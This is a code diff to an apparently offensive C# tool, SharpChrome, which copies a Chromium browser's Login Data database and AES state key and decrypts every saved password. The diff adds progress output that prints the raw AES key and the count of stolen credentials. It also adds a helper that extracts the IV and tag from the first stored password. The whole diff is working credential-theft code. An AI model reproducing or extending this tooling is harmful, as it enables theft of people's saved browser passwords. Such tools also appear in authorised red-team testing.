@@ -11,6 +11,7 @@ using System.Text;
 using PInvoke;
 using SharpChrome.Extensions;
 using CsSQLite;
+using SharpDPAPI;
 
 namespace SharpChrome
 {
@@ -58,21 +59,20 @@ namespace SharpChrome
             }
         }
 
-        public static List<logins> ReadLocalChromiumLogins(string directory, Browser browser, bool unprotect = false, 
-            bool quiet = false)
+        public static List<logins> ReadLocalChromiumLogins(string directory, Browser browser, IProgress<string> progress = null)
         {
-            if (directory.Contains(Environment.GetEnvironmentVariable("USERPROFILE"))) {
-                unprotect = true;
-            }
-
             var loginDataPath = browser.ResolveLoginDataPath(directory);
             var loginDb = new FileInfo(loginDataPath).CopyTo(Path.GetTempFileName(), true);
+            progress?.Report("Login Data is: " + loginDb.FullName);
             var aesStateKeyPath = browser.ResolveLoginStatePath(directory);
             var aesStateKeyFile = new FileInfo(aesStateKeyPath).CopyTo(Path.GetTempFileName(), true);
+            progress?.Report("AES State key located: " + aesStateKeyFile.FullName);
 
             byte[] aesStateKey = GetChromiumStateKey(aesStateKeyPath, browser);
+            progress?.Report("AES State key is " + Helpers.ByteArrayToString(aesStateKey));
 
             var logins = ParseAndReturnChromeLogins(loginDb.FullName, aesStateKey);
+            progress?.Report($"{logins.Count} saved login creds found");
 
             return logins;
         }
@@ -241,7 +241,22 @@ namespace SharpChrome
 
     internal partial class Chrome
     {
-        public static List<logins> ParseAndReturnChromeLogins(string loginDataFilePath, byte[] aesStateKey)
+        public static System.Tuple<byte[], byte[]> GetIvAndTagFromFirstPassword(string userDirectory, Browser browser, byte[] aesStateKey)
+        {
+            var loginDataFilePath = browser.ResolveLoginDataPath(userDirectory);
+
+            var firstLogin = ParseAndReturnChromeLogins(loginDataFilePath, aesStateKey, "SELECT * FROM logins LIMIT 1");
+
+            var segments = firstLogin.First().ToBinaryChromePass();
+
+            var iv = segments.InitVector;
+            var tag = segments.Tag;
+
+            return new System.Tuple<byte[], byte[]>(iv, tag);
+        }
+
+        public static List<logins> ParseAndReturnChromeLogins(string loginDataFilePath, byte[] aesStateKey,
+            string query = "SELECT * FROM logins")
         {
             // takes an individual 'Login Data' file path and performs decryption/triage on it
             if (!File.Exists(loginDataFilePath)) {
@@ -269,9 +284,7 @@ namespace SharpChrome
                 return default;
             }
             
-            string everyColQuery = "SELECT * FROM logins";
-            
-            List<logins> allLogins = database.Query<logins>(everyColQuery, false);
+            List<logins> allLogins = database.Query<logins>(query, false);
             var allLoginsDecryptedPwd = allLogins.DecryptPasswords(aesStateKey);
             
             database.Close();
